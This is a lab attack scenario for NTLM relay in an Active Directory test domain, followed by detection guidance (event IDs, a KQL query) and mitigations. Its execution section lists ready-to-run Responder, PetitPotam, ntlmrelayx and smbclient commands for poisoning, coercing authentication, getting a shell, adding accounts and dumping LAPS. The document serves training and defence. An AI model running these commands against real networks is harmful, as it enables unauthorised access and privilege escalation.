# Attack Scenario: NTLM Relay Attack
NTLM Relay allows an attacker to intercept and relay authentication attempts to another server, impersonating the original user. This enables command execution or access to services as the victim account — without needing to crack the hash.

## MITRE ATT&CK Techniques:
- T1557.001 – Adversary-in-the-Middle: LLMNR/NBT-NS Spoofing
- T1557.002 – SMB/NTLM Relay

## Lab Environment
- **Attacker system:** attacker-vm (Linux or Windows)
- **Domain Controller:** dc01.internal.lab
- **Victim host:** Any domain-joined machine with SMB traffic
- **Relayed target:** Server with exposed SMB/HTTP and unmitigated NTLM relay vector
- **Tools:** Impacket, Responder, ntlmrelayx.py, mitm6, PetitPotam

## Preconditions:

At least one domain device is susceptible to LLMNR/NBT-NS poisoning, or

Attacker can coerce authentication (e.g., via PetitPotam)

## Objectives
Capture NTLM authentication attempts

Relay them to a target accepting NTLM

Gain shell access or perform privileged operations without credentials
## Execution Steps
### 1. Prepare Responder (optional)
For environments with LLMNR/NetBIOS enabled:

```Responder -I eth0 -dvP```
Or disable Responder and use mitm6/PetitPotam for modern relay setups.

### 2. Coerce Authentication (if needed)
Use PetitPotam:

```python3 petitpotam.py -u <user> -p <pass> -d internal.lab <target-ip>```

Alternatively, trigger SMB connection from a misconfigured printer or GPO.

### 3. Run NTLMRelayX
To gain a shell:

```ntlmrelayx.py -t smb://target.internal.lab -smb2support --no-wcf-server```
To add a user:

```ntlmrelayx.py -t ldap://dc01.internal.lab --add-user testuser --add-computer testpc$```
To dump SAM or LAPS:

```ntlmrelayx.py -t ldap://dc01.internal.lab --dump-laps```

### 4. Confirm Access
For SMB shell:

```smbclient.py INTERNAL/testuser@target.internal.lab```
Or confirm the newly added user in AD.

## Detection Guidance
### Logs and Events
Event ID 4624: Logons with unexpected accounts or source IPs

4742: Computer object added or modified

### Defender for Identity: NTLM relay detection

Microsoft 365 Defender: “Suspicious SMB client behavior”

### KQL Example – Unusual Auth to Domain Controller
```
SecurityEvent
| where EventID == 4624
| where TargetUserName != AccountName
| where LogonProcessName == "NtLmSsp"
| where AccountType == "User"
| summarize count() by Computer, Account, IpAddress, bin(TimeGenerated, 1h)
```
## Mitigations
- Disable NTLM where possible (Network security: Restrict NTLM)
- Enable SMB signing and LDAP signing/channel binding
- Monitor for LLMNR, NBNS, and unexpected name resolution traffic
- Restrict local admin rights across workstations and servers

## References
- https://github.com/SecureAuthCorp/impacket
- https://dirkjanm.io/ntlm-relaying-to-ldap-with-ldaps/
- https://attack.mitre.org/techniques/T1557/002/
- https://book.hacktricks.xyz/windows-hardening/windows-local-ntlm-relay

## Navigation
[Back to Lab Index:](../../README.md)
[Related: PetitPotam Coercion](./petitpotam)